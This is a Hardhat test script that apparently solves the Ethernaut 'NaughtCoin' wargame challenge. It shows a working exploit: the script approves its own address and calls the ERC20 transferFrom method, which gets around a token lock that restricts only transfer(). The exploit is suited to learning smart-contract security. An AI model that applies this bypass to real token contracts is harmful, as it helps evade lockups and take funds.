const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("NaughtCoinHack", function () {

    let deployer, anotherAccount;
    let contract;
    
    beforeEach(async function () {
        [deployer, anotherAccount] = await ethers.getSigners();
        // const NaughtCoin = await ethers.getContractFactory("NaughtCoin");
        // console.log("Deploying with address ", deployer.address);
        // contract = await NaughtCoin.deploy(deployer.address);
        // target_address = contract.address;
        // console.log("NaughtCoin deployed to: "+target_address);
        target_address = "0xCCfF7946b99f150e23eccA7683405178A322d270";
        contract = await ethers.getContractAt("NaughtCoin", target_address);
    });
    
    it("Attack", async function () {        
        //check prior status to be valid
        let balance = ethers.BigNumber.from(await contract.balanceOf(deployer.address));
        console.log("Initial token balance: "+balance);
        expect(balance).to.be.equal(ethers.BigNumber.from("1000000000000000000000000"));
        
        console.log("Executing hack...");
        // give allowance for other address
        // execute transferFrom method from ERC20 standard to bypass the blocked transfer method in NaughtCoin.
        console.log("Approving transfer...");
        await contract.approve(deployer.address, balance);
        // approveTx.wait(2);
        console.log("Transferring...")
        let transferFromTx = await contract.transferFrom(deployer.address, target_address, balance);
        await transferFromTx.wait(1);
        console.log("Transfer complete.");

        //expect tokens has been transferred
        balance = await contract.balanceOf(deployer.address);
        console.log("Updated token balance: "+balance);
        expect(balance).to.equal(0);
  });

  afterEach(async function() {
  });

});
